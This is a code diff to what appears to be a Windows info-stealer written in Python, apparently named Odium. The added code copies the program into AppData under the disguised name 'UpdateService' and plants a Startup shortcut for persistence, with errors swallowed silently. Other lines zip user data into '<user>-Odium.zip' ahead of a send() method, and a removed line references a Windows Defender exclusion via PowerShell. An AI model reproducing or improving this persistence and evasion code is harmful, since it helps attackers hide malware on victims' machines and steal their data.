@@ -115,18 +115,29 @@ class main():
 
 	def startup(self):
 		if not os.path.exists(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink"):
-			shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
-			os.rmdir(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService"); self.startup()
-			shell = win32com.client.Dispatch("WScript.Shell")
-			shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
-			shortcut.IconLocation = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
-			shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
-			shortcut.save()
+			try: shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
+			except: pass
+			try:
+				shell = win32com.client.Dispatch("WScript.Shell")
+				shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
+				shortcut.IconLocation = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
+				shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
+				shortcut.save()
+			except: pass
+
 		else:
-			os.remove(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
-			for root, subdirs, files in os.walk(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService"):
-				os.remove(files)
-			os.rmdir(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
+			try:
+				for root, subdirs, files in os.walk(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService"):
+					for file in files:
+						os.remove(os.path.join(root, file))
+			except: pass
+
+			try: os.remove(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
+			except: pass
+
+			try:os.remove(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
+			except: pass
+			
 
 
 
@@ -382,7 +393,6 @@ class main():
 			os.remove(os.path.join(self.tempfolder, file))
 		os.rmdir(self.tempfolder)
 		os.remove(os.path.join("C:/Users/"+os.getlogin(), os.getlogin()+"-Odium.zip"))
-		self.system(fr"powershell cd C:\; Remove-MpPreference -ExclusionPath {os.getcwd()}")
 		
 
 	def send(self):
